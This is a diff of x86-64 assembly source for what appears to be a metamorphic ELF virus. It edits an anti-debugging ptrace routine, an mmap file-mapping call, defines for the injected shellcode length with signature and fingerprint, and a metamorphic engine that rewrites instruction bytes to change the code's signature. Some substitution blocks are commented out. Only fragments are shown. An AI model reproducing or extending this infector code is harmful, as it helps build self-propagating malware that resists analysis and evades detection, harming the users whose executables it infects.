@@ -200,7 +200,7 @@ anti_debug:
 	mov rdi, 0x10;PTRACE_ATTACH
 	mov rsi, r15 
 	mov rdx, 0
-	mov r10, 0
+	xor r10, r10
 	mov rax, 101;ptrace
 	syscall; ptrace(PTRACE_ATTACH, getppid(), 0, 0);
 	cmp rax, 0
@@ -209,13 +209,13 @@ anti_debug:
 	mov rsi, 0
 	mov rsi, 0
 	mov rdx, 0
-	mov r10, 0
+	xor r10, r10
 	mov rax, 61
 	syscall; wait(pid, 0, 0, 0, 0);	
 	mov rdi, 0x11;PTRACE_DETACH
 	mov rsi, r15 
 	mov rdx, 0
-	mov r10, 0
+	xor r10, r10
 	mov rax, 101;ptrace
 	syscall; ptrace(PTRACE_ATTACH, getppid(), 0, 0);
 	jmp exit_prog; 
@@ -1483,7 +1483,7 @@ map_file:
 	mov rdi, 0; NULL
 	mov rdx, 1; PROT_READ
 	mov r10, 2; MAP_PRIVATE
-	mov r9, 0
+	xor r9, r9
 	NOP
 	NOP
 	NOP
@@ -1718,9 +1718,9 @@ push rdx
 	NOP
 retn
 
-%define SHELLCODE_LEN 9477 ; 44 + 5 (jmp) + 12 (exit) + signature (40) + 116 (fingerprint)
-%define SHELLCODE_JMP_INDEX 9309 ; 44 + 5 (jmp)
-%define PURE_SHELLCODE_LEN 9304 
+%define SHELLCODE_LEN 9321 ; 44 + 5 (jmp) + 12 (exit) + signature (40) + 116 (fingerprint)
+%define SHELLCODE_JMP_INDEX 9153 ; 44 + 5 (jmp)
+%define PURE_SHELLCODE_LEN 9148 
 ; void parse64elf(void *file, int wfd, unsigned long fsize)
 parse64elf:
 	NOP
@@ -3096,19 +3096,19 @@ metamorphic:
 	NOP
 	NOP
 	; mov rbx, 0 -> xor rbx, rbx; NOP; NOP
-	mov rax, 0x6000000000bb; mov ebx, 0x0
-	push rax
-	mov rsi, rsp
+;	mov rax, 0x6000000000bb; mov ebx, 0x0
+;	push rax
+;	mov rsi, rsp
 
-	mov rax, 0x609090db3148; xor rbx, rbx; NOP; NOP
-	push rax
-	mov rdx, rsp
+;	mov rax, 0x609090db3148; xor rbx, rbx; NOP; NOP
+;	push rax
+;	mov rdx, rsp
 
-	mov r10, PURE_SHELLCODE_LEN
-	mov rcx, 5
+;	mov r10, PURE_SHELLCODE_LEN
+;	mov rcx, 5
 
-	call ft_str_replace
-	add rsp, 16
+;	call ft_str_replace
+;	add rsp, 16
 	NOP
 	NOP
 	NOP
@@ -3116,19 +3116,19 @@ metamorphic:
 	NOP
 	NOP
 	; mov rcx, 0 -> xor rcx, rcx; NOP; NOP
-	mov rax, 0x6000000000b9; mov ecx, 0x0
-	push rax
-	mov rsi, rsp
+;	mov rax, 0x6000000000b9; mov ecx, 0x0
+;	push rax
+;	mov rsi, rsp
 
-	mov rax, 0x609090c93148; xor rcx, rcx; NOP; NOP
-	push rax
-	mov rdx, rsp
+;	mov rax, 0x609090c93148; xor rcx, rcx; NOP; NOP
+;	push rax
+;	mov rdx, rsp
 
-	mov r10, PURE_SHELLCODE_LEN
-	mov rcx, 5
+;	mov r10, PURE_SHELLCODE_LEN
+;	mov rcx, 5
 
-	call ft_str_replace
-	add rsp, 16
+;	call ft_str_replace
+;	add rsp, 16
 	NOP
 	NOP
 	NOP
@@ -3136,19 +3136,19 @@ metamorphic:
 	NOP
 	NOP
 	; mov rdx, 0 -> xor rdx, rdx; NOP; NOP
-	mov rax, 0x6000000000ba; mov edx, 0x0
-	push rax
-	mov rsi, rsp
+;	mov rax, 0x6000000000ba; mov edx, 0x0
+;	push rax
+;	mov rsi, rsp
 
-	mov rax, 0x609090d33148; xor rdx, rdx; NOP; NOP
-	push rax
-	mov rdx, rsp
+;	mov rax, 0x609090d33148; xor rdx, rdx; NOP; NOP
+;	push rax
+;	mov rdx, rsp
 
-	mov r10, PURE_SHELLCODE_LEN
-	mov rcx, 5
+;	mov r10, PURE_SHELLCODE_LEN
+;	mov rcx, 5
 
-	call ft_str_replace
-	add rsp, 16
+;	call ft_str_replace
+;	add rsp, 16
 
 	NOP
 	NOP
